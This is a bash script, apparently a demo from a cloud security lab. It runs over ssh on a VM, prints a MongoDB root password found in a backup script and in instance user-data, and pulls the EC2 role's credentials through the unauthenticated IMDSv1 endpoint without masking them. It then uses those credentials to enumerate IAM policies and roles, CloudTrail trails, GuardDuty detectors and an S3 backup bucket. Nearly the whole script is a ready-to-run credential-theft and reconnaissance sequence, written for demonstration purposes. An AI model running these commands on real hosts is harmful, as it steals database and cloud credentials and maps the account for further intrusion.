#!/usr/bin/env bash
# RAW variant of 03_imds_role_theft.sh -- no labels, no commentary, no redaction.
#
#   ssh -i ~/.ssh/wiz_mongo_vm ubuntu@<vm-ip> 'bash -s' < this-file
#
# Prints each command before running it, then the unmodified output. Nothing is
# interpreted and nothing is masked, so a technical audience can see that every
# value came off the host rather than from a narration wrapper. Narrate it
# yourself; use 03_imds_role_theft.sh when you want the annotated version.
#
# WARNING: this prints the real MongoDB root password and the real instance
# role credentials. Only run it where that is acceptable -- a throwaway lab, or
# after rotating. It is otherwise identical in substance to the annotated script.
set -uo pipefail

run() { printf '\n$ %s\n' "$*"; eval "$@"; }

# --- the MongoDB root password, in two places on this host -------------------
run 'ls -l /usr/local/bin/mongo-backup.sh'
run 'cat /usr/local/bin/mongo-backup.sh'
run 'curl -s http://169.254.169.254/latest/user-data | grep -E "pwd:|admin_password"'

# --- the instance role, via IMDSv1 (plain GET, no token) ----------------------
run 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/'
ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
run "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE}"

# --- what that role is, and what it can reach --------------------------------
run '/usr/local/bin/aws sts get-caller-identity'
run "/usr/local/bin/aws iam list-attached-role-policies --role-name ${ROLE}"
run '/usr/local/bin/aws iam list-roles --query "length(Roles)" --output text'
run '/usr/local/bin/aws cloudtrail describe-trails --query "trailList[].Name" --output text'
run '/usr/local/bin/aws guardduty list-detectors --output text'
run '/usr/local/bin/aws s3 ls s3://text2sql-mongo-backups-131166810866/backups/'
echo
